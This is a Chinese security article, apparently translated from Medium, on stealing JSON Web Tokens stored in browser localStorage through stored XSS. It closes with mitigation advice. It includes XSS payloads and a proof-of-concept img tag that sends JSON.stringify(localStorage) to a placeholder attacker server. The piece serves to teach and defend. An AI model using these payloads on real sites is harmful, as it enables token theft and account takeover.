![](https://image.3001.net/images/20200301/1583062285_5e5b9d0d6d459.png!small)

##  写在前面的话

 **在过去的几个月时间里，我遇到过一些JSON
Web令牌（JWT）的不安全实现，而这些不安全实现最终导致了目标Web应用程序遭到黑客入侵。在某些场景中，攻击者可以利用错误配置并通过XSS漏洞来窃取管理员令牌，或伪造用户注册过程中的用户协议并利用管理员权限创建标准用户账号。**

JWT与传统的Cookie有所不同，它们虽然很相似，但很多人会错误地认为攻击者无法使用这种方式来对JWT进行攻击。

在这篇文章中，我们将对JWT进行简单介绍，以及JWT和传统Cookie之间的区别，并演示如何窃取JWT，最后还会给出相应的安全解决方案。

##  JSON Web令牌是什么？

简而言之，JWT，即JSON
Web令牌，它可以帮助用户快速简单地完成系统的身份验证（一般使用开源库实现验证机制）。JWT由以下三个部分组成，每个部分由“.”分隔：

    
    
    header.payload.signature

header表明所使用的哈希算法，payload中包含与用户相关的信息（例如角色和访问权限等），signature用于确保消息完整性。

在大多数配置中，当用户提供了有效凭证时，这个令牌会在HTTP头中进行设置，并用于后续身份授权，这一点跟标准的会话Cookie类似。

最近这几年，社区曝光过很多JWT的相关漏洞，而且也有很多技术文章对这些漏洞进行过讨论了，比如说算法攻击以及通过Payload篡改来实现提权等等。那么在这篇文章中，我并不打算过多去讨论JWT架构以及之前的相关漏洞。

##  如何恢复传统Cookie和JWT

Cookie的作用就在于，它可以向一个有状态协议（例如HTTP）提供相关的状态信息。我们举一个简单的例子，会话Cookie就可以用来追踪一款Web应用程序上经过身份验证的用户会话。为了实现这一点，会话的记录必须同时存在于服务器端和客户端上。

从JWT的角度来看，令牌可以是无状态的。也就是说，服务器端是不会存储会话记录的。相反，每一个发送至服务器端的请求都会包含一个用户令牌，服务器会根据令牌信息来验证用户的身份权限。

Cookie和JWT都遵循相似的事件流来请求和接收会话令牌，当用户提供有效的身份凭证之后，服务器会返回一个包含了会话令牌的响应。不同之处就在于，Cookie是使用SET-COOKIE命令设置的，但JWT一般是在AUTHORIZATION头中设置的。

##  它们存储在哪里?

我们用默认配置来进行总结：

###  localStorage / sessionStorage

默认情况下，Web了浏览器容器几乎是相同的。关闭浏览器之后，localStorage将保持不变，sessionStorage仅持续到浏览器关闭之前。因此，只能在客户端读取到，而不能在服务器端读取到，而且只能通过JavaScript读取到。

###  Cookie

我们的目的是要让发送的信息在服务器端读取和验证。如果配置了正确的保护机制，恶意JavaScript将很难读取到这些数据。

![](https://image.3001.net/images/20200301/1583062339_5e5b9d43ed09a.png!small)

##  传统Cookie保护

一般来说，攻击者会通过XSS漏洞来攻击身份认证Cookie，然后尝试劫持目标的管理员会话，并最终通过攻击包含漏洞的Web服务器打开进入目标网络系统的“大门”，

我们可以为存储在Cookie容器中的数据设置Header参数，除了解决底层XSS问题之外，有HttpOnly、secure、path和domain等标志可以提供不同级别的安全保护。然后再将JWT存储在localStorage中......这就像将密码存储在文本文件中一样。

##  如何通过XSS漏洞窃取localStorage中的JWT

在近期的一次研究中，我发现了一个存储型XSS漏洞，而目标应用程序正好使用了JWT来作为身份验证机制的实现。Payload设置成功后，任何访问了该Web页面的用户其JWT都会被发送给攻击者。

一开始，我无法通过XSS来获取JWT。主要是因为每个JWT都存储有唯一的标识符/键，所以在不知道这些信息的情况下是无法调用它的。比如说，在JavaScript警告框中显示标准Cookie（无保护机制）的典型方法如下：

    
    
    <script>alert(document.cookie)</script>

因为localStorage中的数据会存储在一个数组中，它无法通过类似方法来调用或读取：

    
    
    <script>alert(localStorage)</script>

![](https://image.3001.net/images/20200301/1583062377_5e5b9d6981aaf.png!small)

但是，我们可以通过使用getItem()函数来获取存储在localStorage或sessionStorage中的每一个对象：

    
    
    <script>alert(localStorage.getItem(‘key’))</script>

###  参考样例：

    
    
    <script>alert(localStorage.getItem(‘ServiceProvider.kdciaasdkfaeanfaegfpe23.username@company.com.accessToken’))</script>

![](https://image.3001.net/images/20200301/1583062393_5e5b9d795e714.png!small)

如上图所示，我们还需要弄清楚“key”这个唯一标识符是什么：

![](https://image.3001.net/images/20200301/1583062400_5e5b9d807d2e4.png!small)

我猜有的人可能已经想用暴力破解的方式了吧，或者写一个JavaScript脚本来迭代localStorage中的每一个对象。这里我们可以使用JSON.Stringify来实现，这个函数可以将localStorage中存储的内容转换为字符串并绕过这种障碍：

    
    
    <script>alert(JSON.stringify(localStorage))</script>

![](https://image.3001.net/images/20200301/1583062414_5e5b9d8e9fae1.png!small)

###  下面给出的是利用XSS窃取JWT的完整PoC：

    
    
    <img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>

![](https://image.3001.net/images/20200301/1583062424_5e5b9d98c000d.png!small)

根据不同目标系统的实现机制，上述的PoC可能会给我们提供IdToken、accessToken或其他相关的令牌。IdToken可以用于身份验证并伪装成有问题的用户，其本质上是帐户接管，而accessToken可用身份验证端点来生成一个的全新IdToken。

这里最大的问题就在于，我们无法将传统的Cookie安全标志应用到localStorage中存储的项。

##  缓解方案

>
> 1、永远不要在localStorage中存储任何敏感信息，比如说JWT或其他关键的凭据信息。localStorage的目的是通过保存网站状态和设置来为用户提供更好的体验度。
>
> 2、可以考虑使用Cookie头。
>
> 3、设置Cookie头保护机制。
>
> 4、永远不要在页面、URL以及其他源代码中显示令牌。

 *** 参考来源：[medium](https://medium.com/redteam/stealing-jwts-in-localstorage-via-xss-6048d91378a0)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

